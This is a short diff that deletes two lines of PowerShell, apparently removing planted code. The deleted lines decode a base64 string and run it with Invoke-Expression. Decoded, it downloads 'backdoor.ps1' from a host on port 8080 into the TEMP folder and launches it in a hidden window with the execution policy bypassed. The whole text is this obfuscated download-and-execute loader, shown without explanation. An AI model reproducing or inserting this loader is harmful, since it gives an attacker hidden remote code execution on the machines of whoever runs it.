@@ -1,2 +1,0 @@
-$s = "JFdlYkNsaWVudCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5XZWJDbGllbnQNCiRXZWJDbGllbnQuRG93bmxvYWRGaWxlKCJodHRwOi8vMTkyLjE2OC4xLjExMDo4MDgwL2JhY2tkb29yLnBzMSIsICIkRW52OlRFTVBcXGJhY2tkb29yLnBzMSIpDQpjbWQgL2Mgc3RhcnQgL21pbiAiIiBwb3dlcnNoZWxsIC1XaW5kb3dTdHlsZSBIaWRkZW4gLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgJEVudjpURU1QXGJhY2tkb29yLnBzMQ0KZXhpdA==";$sd = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($s))
-Invoke-Expression $sd
